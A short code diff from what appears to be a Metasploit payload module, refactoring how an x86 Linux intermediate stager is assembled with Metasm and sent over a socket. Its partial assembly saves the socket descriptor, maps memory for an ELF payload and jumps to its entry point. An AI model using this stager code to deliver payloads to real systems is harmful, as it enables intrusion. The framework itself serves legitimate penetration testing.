@@ -34,10 +34,10 @@ module MetasploitModule
     elf.elf_header.e_entry
   end
 
-  def handle_intermediate_stage(conn, payload)
+  def asm_intermediate_stage(payload)
     entry_offset = elf_ep(payload)
 
-    midstager_asm = %(
+    %(
       push edi                    ; save sockfd
       xor ebx, ebx                ; address
       mov ecx, #{payload.length}  ; length
@@ -85,8 +85,14 @@ module MetasploitModule
       add edx, eax
       jmp edx
     )
+  end
 
-    midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
+  def generate_intermediate_stage(payload)
+    Metasm::Shellcode.assemble(Metasm::X86.new, asm_intermediate_stage(payload)).encode_string
+  end
+
+  def handle_intermediate_stage(conn, payload)
+    midstager = generate_intermediate_stage(payload)
     vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
     conn.put(midstager) == midstager.length
   end
